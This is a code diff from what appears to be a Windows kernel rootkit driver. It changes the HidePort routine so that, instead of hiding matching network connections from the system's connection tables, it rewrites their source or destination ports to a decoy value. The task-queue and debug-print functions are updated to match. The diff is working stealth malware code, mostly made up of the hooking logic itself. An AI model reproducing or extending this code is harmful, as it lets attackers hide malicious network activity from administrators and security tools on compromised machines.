@@ -148,14 +148,14 @@ VOID HidePort(PVOID outputBuffer, ULONG outputBufferSize, ULONG reqType, ULONG p
             for (i = 0; i < entryCount; ++i) {
                 if (task->isSrc) {
                     //DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
-                    if (HTONS(((PCONNINFO101)outputBuffer)[i].src_port) == task->port) {
-                        ((PCONNINFO101)outputBuffer)[i].status = 0;
+                    if (HTONS(((PCONNINFO101)outputBuffer)[i].src_port) == task->target) {
+                        ((PCONNINFO101)outputBuffer)[i].src_port = HTONS(task->newPort);
                     }
                 }
                 else {
                     //DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].dst_port));
-                    if (HTONS(((PCONNINFO101)outputBuffer)[i].dst_port) == task->port) {
-                        ((PCONNINFO101)outputBuffer)[i].status = 0;
+                    if (HTONS(((PCONNINFO101)outputBuffer)[i].dst_port) == task->target) {
+                        ((PCONNINFO101)outputBuffer)[i].dst_port = HTONS(task->newPort);
                     }
                 }
             }
@@ -165,14 +165,14 @@ VOID HidePort(PVOID outputBuffer, ULONG outputBufferSize, ULONG reqType, ULONG p
             for (i = 0; i < entryCount; ++i) {
                 if (task->isSrc) {
                     //DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
-                    if (HTONS(((PCONNINFO102)outputBuffer)[i].src_port) == task->port) {
-                        ((PCONNINFO102)outputBuffer)[i].status = 0;
+                    if (HTONS(((PCONNINFO102)outputBuffer)[i].src_port) == task->target) {
+                        ((PCONNINFO102)outputBuffer)[i].src_port = HTONS(task->newPort);
                     }
                 }
                 else {
                     //DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].dst_port));
-                    if (HTONS(((PCONNINFO102)outputBuffer)[i].dst_port) == task->port) {
-                        ((PCONNINFO102)outputBuffer)[i].status = 0;
+                    if (HTONS(((PCONNINFO102)outputBuffer)[i].dst_port) == task->target) {
+                        ((PCONNINFO102)outputBuffer)[i].dst_port = HTONS(task->newPort);
                     }
                 }
             }
@@ -182,14 +182,14 @@ VOID HidePort(PVOID outputBuffer, ULONG outputBufferSize, ULONG reqType, ULONG p
             for (i = 0; i < entryCount; ++i) {
                 if (task->isSrc) {
                     //DbgPrint("TYPE 0x101 SRC %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
-                    if (HTONS(((PCONNINFO110)outputBuffer)[i].src_port) == task->port) {
-                        ((PCONNINFO110)outputBuffer)[i].status = 0;
+                    if (HTONS(((PCONNINFO110)outputBuffer)[i].src_port) == task->target) {
+                        ((PCONNINFO110)outputBuffer)[i].src_port = HTONS(task->newPort);
                     }
                 }
                 else {
                     //DbgPrint("TYPE 0x101 DST %d\n", HTONS(((PCONNINFO101)outputBuffer)[i].src_port));
-                    if (HTONS(((PCONNINFO110)outputBuffer)[i].dst_port) == task->port) {
-                        ((PCONNINFO110)outputBuffer)[i].status = 0;
+                    if (HTONS(((PCONNINFO110)outputBuffer)[i].dst_port) == task->target) {
+                        ((PCONNINFO110)outputBuffer)[i].dst_port = HTONS(task->newPort);
                     }
                 }
             }
@@ -250,12 +250,13 @@ NTSTATUS CompletionRoutine(
 
 
 
-VOID TaskQueueByNet(ULONG input, BOOLEAN isSrc) {
+VOID TaskQueueByNet(ULONG target, ULONG newPort, BOOLEAN isSrc) {
 
     PTASK_QUEUE_NET task = (PTASK_QUEUE_NET)ExAllocateFromPagedLookasideList(&glPagedTaskQueueNet);
     if (isSrc) task->isSrc = TRUE;
     else task->isSrc = FALSE;
-    task->port = input;
+    task->target = target;
+    task->newPort = newPort;
     InsertTailList(&glTaskQueueNet, &task->link);
 
 }
@@ -277,10 +278,10 @@ VOID PrintTaskQueueNetList() {
         PTASK_QUEUE_NET task = CONTAINING_RECORD(pLink, TASK_QUEUE_NET, link);
 
         if (task->isSrc) {
-            DbgPrint("SRC_PORT: %d\n", task->port);
+            DbgPrint("SRC_PORT: %d -> %d\n", task->target, task->newPort);
         }
         else {
-            DbgPrint("DST_PORT: %d\n", task->port);
+            DbgPrint("DST_PORT: %d -> %d\n", task->target, task->newPort);
         }
     }
 }
